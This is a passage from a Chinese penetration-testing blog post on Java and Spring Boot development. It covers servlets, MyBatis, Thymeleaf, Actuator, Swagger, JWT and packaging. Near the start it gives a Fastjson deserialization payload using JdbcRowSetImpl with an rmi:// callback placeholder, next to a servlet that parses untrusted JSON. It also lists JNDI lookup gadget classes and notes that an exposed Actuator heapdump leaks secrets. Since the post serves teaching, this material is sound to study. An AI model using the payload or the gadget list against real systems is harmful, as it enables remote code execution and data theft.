javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/fj&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjWeb</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsondata</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;jd&quot;</span>);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jso</span> <span class="operator">=</span> JSON.parseObject(jsondata);</span><br><span class="line">        System.out.println(jso);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://dnslog地址&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里@type里的内容为什么是这个呢？看下面</p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>在RMI服务中调用了 <strong>InitialContext.lookup()</strong> 的类有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>在LDAP服务中调用了 <strong>InitialContext.lookup()</strong> 的类有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>由Pivotal团队提供的一套开源框架，可以简化spring应用的创建和部署，降低了复杂性</p><h2 id="基础代码"><a href="#基础代码" class="headerlink" title="基础代码"></a>基础代码</h2><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211222635433.png" alt="image-20240211222635433"></p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211222712670.png" alt="image-20240211222712670"></p><p>新建一个controller.IndexCon的类，然后在IndexCon中写入如下代码，&#x2F;zs是我们写的路由访问地址，返回zhangsan，但是在启动时需要在SbDemoApplication这个文件中进行启动，如果端口冲突，可以在resources文件夹下的application.properties文件中修改端口</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211223453890.png" alt="image-20240211223453890"></p><p>GET请求和POST请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.sbdemo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexCon</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/zs&quot;,method = RequestMethod.GET)</span> <span class="comment">//指定get路由，@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/ls&quot;,method = RequestMethod.POST)</span> <span class="comment">//指定post路由，@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">postindex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;lisi&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 以下两个是有参数的请求</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/zs_pa&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getpa</span><span class="params">(<span class="meta">@RequestParam</span> String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GET请求name参数的值为：&quot;</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/ls_pa&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">postpa</span><span class="params">(<span class="meta">@RequestParam</span> String xm)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;POST请求xm参数的值为：&quot;</span>+xm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据库应用–Mybatis"><a href="#数据库应用–Mybatis" class="headerlink" title="数据库应用–Mybatis"></a>数据库应用–Mybatis</h2><p>创建和上面的步骤一样，在添加依赖项时要多加两个：<strong>MyBatis Framework</strong>，<strong>Mysql Driver</strong>，它会在pom.xml中自动声明</p><p>在src-main-resources目录下找到application.properties，改名为application.yml，添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">datasource:</span><br><span class="line">url: jdbc:mysql://localhost:3306/db1</span><br><span class="line">username: root</span><br><span class="line">password: 123456</span><br><span class="line">driver-class-name: com.mysql.cj.jdbc.Driver</span><br></pre></td></tr></table></figure><p>按照专业的写法，创建一个entity.User的类来操作数据库数据，比如我们数据库的表里有id，username，password三个字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dba.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们创建mapper.UserMapper动态接口代理类实现，注意：这里是接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.dba.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"><span class="keyword">import</span> org.example.dba.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMap</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from admin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from admin where id = 1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findID</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们创建Controller来实现web访问调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.dba.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.dba.entity.User;</span><br><span class="line"><span class="keyword">import</span> org.example.dba.mapper.UserMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserCon</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMap UserMap;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/getadmin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getadmindata</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; all = UserMap.findAll();</span><br><span class="line">        <span class="keyword">return</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/getone&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getonedata</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; all = UserMap.findID();</span><br><span class="line">        <span class="keyword">return</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于它的sql注入可以自行看一下，能造成漏洞的原因有限，后面会单独说一下</p><h2 id="模版引擎–Thymeleaf"><a href="#模版引擎–Thymeleaf" class="headerlink" title="模版引擎–Thymeleaf"></a>模版引擎–Thymeleaf</h2><p>新建项目时和上面的基础代码那里一样，在依赖项那里勾选Template Engines下的 <strong>Thymeleaf</strong></p><p>先看一下application.properties文件，可以看到它里面显示了模版文件存放位置，就是classpath后面的内容，一般为templates，我们可以在application.properties同级目录下创建templates目录，比如在这个目录下写一个test.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>TiTle<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;data&#125;&quot;</span>&gt;</span> 内容 <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们正常写一个类，Controller.Thy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">// 注意这里是Controller而非RestController</span></span><br><span class="line"><span class="comment">// 因为RestController会有ResponseBody，将return的值当作字符串解析</span></span><br><span class="line"><span class="comment">// 但是Controller没有ResponseBody，将return的值当作资源文件去渲染</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Thy</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;输出的内容&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时我们访问test接口就会发现将内容渲染了，注意Controller和RestController的区别</p><h2 id="监控系统–Actuator"><a href="#监控系统–Actuator" class="headerlink" title="监控系统–Actuator"></a>监控系统–Actuator</h2><p>Spring Actuator 模块提供了生产级别的功能，比如健康检查，审计，指标收集，HTTP跟踪等，帮助我们监控和管理Spring Boot应用</p><p>新建项目，依赖项那里勾选Spring Web和Ops下面的Spring Boot Actuator，其他的地方都比较简单，自行看一下资料即可，主要看一下它的安全问题，我们最关注的几个地方</p><p>&#x2F;actuator&#x2F;heapdump：heapdump端点提供来自应用程序JVM的堆转储，我们可以通过访问这个地址直接将heapdump文件下载下来，通过工具JDumpSpider提取器（ <a href="https://github.com/whwlsfb/JDumpSpider/releases">https://github.com/whwlsfb/JDumpSpider/releases</a> ）来获取敏感信息</p><p>这里先简单了解一下，后期java安全的章节会着重讲一下</p><h2 id="接口系统–Swagger"><a href="#接口系统–Swagger" class="headerlink" title="接口系统–Swagger"></a>接口系统–Swagger</h2><p>Swagger是当下比较流行的实时接口文档生成工具。接口文档是当前前后端分离项目中必不可少的工具，在前后端开发之前，后端要先出接口文档，前端根据接口文档来进行项目的开发，双方开发结束后在进行联调测试</p><p>这个在新建项目时依赖项直接选Spring web就好，依赖项里面没有关于Swagger的内容，需要在pom.xml中设置</p><p>以下是2版本的引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以下是3版本的引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2版本在使用时，需要在入口文件中添加以下内容，访问路径为&#x2F;swagger-ui.html</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableSwagger2</span></span><br></pre></td></tr></table></figure><p>3版本时需要改为，当然，不加也行，访问路径为&#x2F;swagger-ui&#x2F;index.html</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableOpenApi</span></span><br></pre></td></tr></table></figure><p>除此之外还需要在application.properties中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.mvc.pathmatch.matching-strategy=ant_path_matcher</span><br></pre></td></tr></table></figure><p>在页面里，我们可以看到所有的接口信息，但是如果数量过于庞大，我们需要借助工具实现，比如 postman，打开后点击API–导入–链接，然后将URL输入（URL为页面API文档下面的地址而非访问的url），在后期API安全会详细讲解</p><h2 id="身份鉴权–JWT"><a href="#身份鉴权–JWT" class="headerlink" title="身份鉴权–JWT"></a>身份鉴权–JWT</h2><p>JWT（JSON Web Token）是由服务端用加密算法对信息签名来保证其完整性和不可伪造性，Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息，JWT用于身份认证、会话维持等，由三部分组成，header、payload与signature，这三个部分用 <strong>.</strong> 来隔开</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240217123142379.png" alt="image-20240217123142379"></p><p>新建文件时直接选择Spring Web即可，然后在pom.xml中写入依赖，去mvn搜索Java JWT即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.jwt.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.JWT;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.JWTVerifier;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.algorithms.Algorithm;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.interfaces.DecodedJWT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtCon</span> &#123;</span><br><span class="line">    <span class="comment">//JWT创建</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//JWT.create().withHeader();//设置header部分</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jwttoken</span> <span class="operator">=</span> JWT.create().withClaim(<span class="string">&quot;userid&quot;</span>,<span class="number">1</span>)</span><br><span class="line">                    .withClaim(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                    .withClaim(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>)<span class="comment">//设置payload部分</span></span><br><span class="line">                    .sign(Algorithm.HMAC256(<span class="string">&quot;qax&quot;</span>));<span class="comment">//设置签名算法和密钥</span></span><br><span class="line">        <span class="comment">//JWT.create().withExpiresAt();//设置过期时间</span></span><br><span class="line">        System.out.println(jwttoken);</span><br><span class="line">        jwtcheck(jwttoken);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//JWT校验</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">jwtcheck</span><span class="params">(String jwtdata)</span>&#123;</span><br><span class="line">        <span class="comment">// 构建解密注册</span></span><br><span class="line">        <span class="type">JWTVerifier</span> <span class="variable">jwtde</span> <span class="operator">=</span> JWT.require(Algorithm.HMAC256(<span class="string">&quot;qax&quot;</span>)).build();</span><br><span class="line">        <span class="comment">// 解密注册数据</span></span><br><span class="line">        <span class="type">DecodedJWT</span> <span class="variable">verify</span> <span class="operator">=</span> jwtde.verify(jwtdata);</span><br><span class="line">        <span class="comment">//提取注册解密数据</span></span><br><span class="line">        System.out.println(verify.getClaim(<span class="string">&quot;username&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JWT官方解密网站： <a href="https://jwt.io/">https://jwt.io</a></p><p>从代码可以看出来，解密能否成功的关键就是sign签名部分，所以如果你修改了一部分数据想要越权但是你不知道sign同样无法成功</p><h2 id="打包部署–JAR-WAR"><a href="#打包部署–JAR-WAR" class="headerlink" title="打包部署–JAR&#x2F;WAR"></a>打包部署–JAR&#x2F;WAR</h2><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240217140300366.png" alt="image-20240217140300366"></p><p>如上，先clean一下然后再打包，记得看一下pom.xml文件里的configuration，看是否存在mainClass，然后将skip的值改为false</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240217140430564.png" alt="image-20240217140430564"></p><p>以上是jar打包方式，如果是war，只需要在pom.xml文件中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在入口文件中修改如下构建即可</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240217141426536.png" alt="image-20240217141426536"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要写一些Java方面的开发知识，让大家对java有一个全面的了解&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Java-Servlet&quot;&gt;&lt;a href=&quot;#Java-Servlet&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
    
    <category term="开发" scheme="https://ink-scholar.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--安全开发(上)</title>
